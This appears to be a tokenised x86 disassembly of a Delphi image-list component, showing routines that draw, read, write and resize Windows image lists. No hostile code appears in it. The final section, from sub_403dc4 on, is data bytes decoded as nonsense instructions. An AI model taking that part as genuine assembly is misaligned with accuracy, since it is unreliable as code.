mov eax [ r-xdata ]
call sub_414588
mov edx [ ebp - 0x4 ]
mov [ edx + 0x48 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
mov dl 0x1
mov eax [ ebp - 0x18 ]
call sub_415d74
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x28 ]
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x24 ]
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_403080
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4028dc
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x37 ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_4030dc
push ebp
mov ebp esp
add esp 0xffffffd0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x28 ]
xor edx edx
xor eax eax
call sub_43b7c8
mov eax [ ebp - 0x4 ]
call sub_403cd4
xor eax eax
push ebp
push sub_40327b
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_414588
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_40325e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x24 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x28 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_414588
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_403241
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_415d74
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x24 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x28 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_403248
mov eax [ ebp - 0x14 ]
call sub_44c070
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebp - 0x10 ]
call sub_414c24
mov [ ebp - 0x1c ] eax
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x1c ]
call sub_40f808
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
call sub_40fc38
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x14 ]
call sub_414c24
mov [ ebp - 0x20 ] eax
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x20 ]
call sub_40f808
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
call sub_40fc38
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_402c08
inc [ ebp - 0xc ]
dec [ ebp - 0x18 ]
jne r-xdata
sub_403288
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
call sub_402a74
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4030dc
sub_4032b0
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_402b08
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43cd0c
mov eax [ ebp - 0x4 ]
call sub_402da8
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov al [ eax + 0x35 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x35 ] al
mov eax [ ebp - 0xc ]
mov al [ eax + 0x37 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x37 ] al
mov eax [ ebp - 0xc ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_403524
mov eax [ ebp - 0xc ]
mov al [ eax + 0x36 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x36 ] al
mov eax [ ebp - 0xc ]
call sub_402a74
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4029e4
mov eax [ ebp - 0x4 ]
call sub_4028dc
test al al
jne r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_402a74
push eax
call ImageList_SetIconSize
mov eax [ ebp - 0x4 ]
call sub_4028f8
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_402a74
push eax
call ImageList_GetBkColor
call sub_4026cc
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_402dc0
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x3c ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x3c ] eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_403288
jmp r-xdata
sub_4033b0
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43ce10
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x35 ]
mov edx [ ebp - 0xc ]
mov [ edx + 0x35 ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x37 ]
mov edx [ ebp - 0xc ]
mov [ edx + 0x37 ] al
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
call sub_403524
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x36 ]
mov edx [ ebp - 0xc ]
mov [ edx + 0x36 ] al
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
mov edx [ ebp - 0xc ]
mov [ edx + 0x3c ] eax
mov eax [ ebp - 0xc ]
call sub_402da8
mov eax [ ebp - 0x4 ]
call sub_402a74
mov edx eax
mov eax [ ebp - 0xc ]
call sub_4029e4
mov eax [ ebp - 0xc ]
call sub_4028dc
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x28 ]
push eax
mov eax [ ebp - 0xc ]
call sub_402a74
push eax
call ImageList_SetIconSize
mov eax [ ebp - 0xc ]
call sub_4028f8
jmp r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_402a74
push eax
call ImageList_GetBkColor
call sub_4026cc
mov edx eax
mov eax [ ebp - 0xc ]
call sub_402dc0
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
call sub_403288
jmp r-xdata
sub_40349c
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_403518
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40351f
lea eax [ ebp - 0xc ]
call sub_44cae0
retn
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x24 ]
jl r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_44e378
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447a00
call sub_44c7a8
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x28 ]
jge r-xdata
sub_403524
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x34 ]
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] al
mov eax [ ebp - 0x4 ]
mov bx 0xfff0
call sub_44c24c
sub_403558
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
xor edx edx
xor eax eax
call sub_43b77c
pop ecx
pop ecx
pop ebp
retn
sub_403574
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4c ] 0x1
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x50 ] 0x0
jg r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_43c464
mov bx 0xffff
call sub_44c24c
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
sub_4035ec
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_43c2dc
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_43c464
cmp eax [ ebp - 0x8 ]
jne r-xdata
sub_403654
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x40 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_43c264
sub_403684
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43eac4
mov ebx eax
mov eax [ ebp - 0x8 ]
call sub_43eac4
cmp ebx eax
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_43eac4
mov ecx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4461ec
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
sub_4036d8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_402cd8
mov ebx eax
mov eax [ ebp - 0x8 ]
call sub_402cd8
cmp ebx eax
je r-xdata
mov al [ ebp - 0x9 ]
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_402cd8
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4037be
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_403c50
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4037a1
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
call sub_403c50
push ebp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_403684
pop ecx
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4037a8
mov eax [ ebp - 0x14 ]
call sub_44c070
retn
mov eax [ ebp - 0x8 ]
call sub_402cd8
test eax eax
jne r-xdata
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_4037d0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_402cd8
test eax eax
setg [ ebp - 0x1 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4036d8
test al al
je r-xdata
mov al [ ebp - 0x1 ]
pop ecx
pop ebp
retn
xor eax eax
jmp r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
sub_403834
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_442610
mov eax [ ebp - 0x8 ]
push eax
push sub_403bc0
mov eax [ ebp - 0x8 ]
push eax
push sub_403c50
push ebp
call sub_4037d0
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40388c
push ebp
mov ebp esp
add esp 0xffffffac
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x24 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
call sub_43eb18
lea edx [ ebp - 0x2c ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
call sub_43eb18
mov dl 0x1
mov eax [ r-xdata ]
call sub_414588
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_403b28
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_43ea80
mov [ ebp - 0x28 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov edx [ ebp - 0x28 ]
add edx [ ebp - 0x24 ]
mov eax [ ebp - 0x8 ]
call sub_43eaa4
mov dl 0x1
mov eax [ r-xdata ]
call sub_414588
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_403b0b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_414588
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x28 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x24 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_414588
mov [ ebp - 0x18 ] eax
mov dl 0x1
mov eax [ ebp - 0x18 ]
call sub_415d74
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x28 ]
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x24 ]
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x28 ]
xor edx edx
xor eax eax
call sub_43b7c8
mov eax [ ebp - 0x4 ]
call sub_403cd4
xor eax eax
push ebp
push sub_403aee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x24 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_403af5
mov eax [ ebp - 0x10 ]
call sub_44c070
mov eax [ ebp - 0x18 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
call sub_403ce4
retn
inc eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x20 ] 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x28 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
inc [ ebp - 0x20 ]
dec [ ebp - 0x30 ]
jne r-xdata
inc eax
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x2c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x24 ]
imul edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
imul eax [ ebp - 0x1c ]
call sub_43b800
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0xc ]
call sub_414c24
push eax
mov eax [ ebp - 0x10 ]
call sub_414c24
lea edx [ ebp - 0x44 ]
pop ecx
call sub_40f694
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x24 ]
imul edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
imul eax [ ebp - 0x1c ]
call sub_43b800
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x14 ]
call sub_414c24
push eax
mov eax [ ebp - 0x18 ]
call sub_414c24
lea edx [ ebp - 0x44 ]
pop ecx
call sub_40f694
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_402c08
dec [ ebp - 0x2c ]
inc [ ebp - 0x1c ]
dec [ ebp - 0x34 ]
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
sub_403b34
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4430dc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_403bb5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_402a34
mov eax [ ebp - 0x4 ]
call sub_402a74
test eax eax
jne r-xdata
sub eax 0xffffffec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_403bbc
mov eax [ ebp - 0xc ]
call sub_44c070
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447ad8
call sub_44c7a8
sub_403bc0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_402b08
mov eax [ ebp - 0x8 ]
call sub_43ea80
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
mov al [ ebp - 0xc ]
and al 0xff
mov [ ebp - 0x11 ] al
mov ax [ ebp - 0xc ]
shr ax 0x8
mov [ ebp - 0x12 ] al
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_43eaa4
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40388c
cmp [ ebp - 0x11 ] 0x49
jne r-xdata
cmp [ ebp - 0x12 ] 0x4c
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_403b34
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_403c50
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4430dc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_403cc8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
call sub_402a74
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_403ccf
mov eax [ ebp - 0xc ]
call sub_44c070
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447ad8
call sub_44c7a8
sub_403ce4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x50 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
dec [ eax + 0x50 ]
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4c ] 0x0
mov eax [ ebp - 0x4 ]
mov bx 0xfff0
call sub_44c24c
sub_403d1c
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_44c060
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4035ec
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_403d64
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov ebx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_403d8c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_403db1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_403db8
retn
sub_403dc4
enter 0x403d 0x0
pop es
adc [ ebx + eax * 2 + 0x6f ] dl
outsb
je r-xdata
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x90900000
mov [ esi ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
inc eax
add al cl
cmp eax 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
loop r-xdata
imul ebp [ esi + 0x65 ] 0x74634164
imul ebp [ edi + 0x6e ] r-xdata
clc
movsb [ edi ] [ esi ]
inc ebx
add [ ebx ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x95300001
inc esp
add [ eax ] cl
add bh bh
cmp al 0x43
inc eax
add [ edx + eax * 2 ] dl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43080002 ] al
popad
je r-xdata
mov al [ 0xffffffff84004425 ]
inc eax
add ah bh
inc eax
add [ eax ] dl
add [ eax ] al
shl [ esi + 0x2c3c0043 ] 0x1
inc esp
add [ eax + 0x100044c2 ] ah
and al [ eax + eax - 0x58 ]
retn 0x44
add [ eax - 0x63ffbb3e ] ch
retn 0x44
outsd
jb r-xdata
or al 0xcd
inc ebx
add [ eax - 0x2fffbbd9 ] dh
inc esi
inc eax
add ah al
daa
inc esp
add [ eax ] dh
sub [ eax + eax - 0x7c ] eax
sub al 0x44
add ah bh
daa
inc esp
add al ah
daa
inc esp
add [ esp + ebp + 0x44d40044 ] bl
inc eax
add [ edi + eax * 2 + 0x40040 ] cl
std
imul ebp [ esi + 0x65 ] 0x74634164
imul ebp [ edi + 0x6e ] 0x5c909090
aas
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
aas
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x55ffbfc1 ] dl
aas
inc eax
add [ eax ] cl
add [ eax ] al
hlt
inc edx
inc eax
add [ eax ] dh
sub [ eax + eax - 0x7c ] eax
sub al 0x44
add ah bh
daa
inc esp
add al ah
daa
inc esp
add [ esp + ebp + 0x2e6c0044 ] bl
inc esp
add [ eax + esi ] dh
inc esp
add al cl
das
inc esp
add [ eax ] ch
das
inc esp
add [ eax + 0x2f ] dl
inc esp
add [ eax + 0x2f ] al
inc esp
add [ eax + 0x44 ] ch
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] dh
xchg ebp eax
inc esp
add [ eax ] cl
add [ eax ] al
add al 0x0
stc
push eax
push ebx
push edx
inc esp
inc ebx
inc eax
add ah bh
inc ebx
inc eax
add [ eax ] ch
inc edx
inc eax
add [ eax + 0x42 ] bl
inc eax
add [ eax ] dl
push esp
inc ebx
outsd
outsb
je r-xdata
add [ eax ] dl
inc esp
add [ ecx * 8 + 0x27b00043 ] cl
inc esp
add [ eax - 0x7bffbbdb ] ah
nop
nop
sbb [ esi ] bh
inc eax
add [ edi ] al
or edx [ ecx + eax * 2 + 0x63 ]
je r-xdata
adc dh cl
inc ebx
outsd
outsb
dec esp
imul ebp [ esi + 0x6b ] r-xdata
int3
sub_403e7c
add al 0xc0
inc esp
add [ eax ] bl
